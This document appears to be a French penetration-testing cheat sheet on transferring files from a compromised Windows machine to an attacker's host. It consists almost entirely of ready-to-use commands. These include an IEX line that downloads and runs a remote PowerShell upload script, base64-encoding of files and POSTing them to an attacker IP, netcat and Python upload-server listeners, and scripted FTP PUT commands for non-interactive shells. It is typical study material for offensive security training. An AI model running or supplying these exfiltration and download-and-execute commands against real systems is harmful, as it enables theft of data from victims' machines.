#### Upload d'un fichier depuis windows en base64

```powershell
[Convert]::ToBase64String((Get-Content -path "$fichier" -Encoding byte))
```

```bash
echo $base64 | base64 -d > $fichier
```

#### Upload d'un fichier via création d'un serveur d'upload

```bash
pip3 install uploadserver
python3 -m uploadserver
```

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://$monIp:8000/upload -File $fichier
```

#### Upload d'un fichier en base64 via netcat

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '$fichier' -Encoding Byte))
Invoke-WebRequest -Uri http://$monIp:8000/ -Method POST -Body $b64
```

```bash
nc -lvnp 8000
echo $base64 | base64 -d -w 0 > $fichier
```

#### Upload d'un fichier via création d'un serveur FTP

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
(New-Object Net.WebClient).UploadFile('ftp://$monIp/ftp-hosts', '$fichier')

Ou, en cas de shell non-interractif:

echo open $monIp > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT $fichier >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
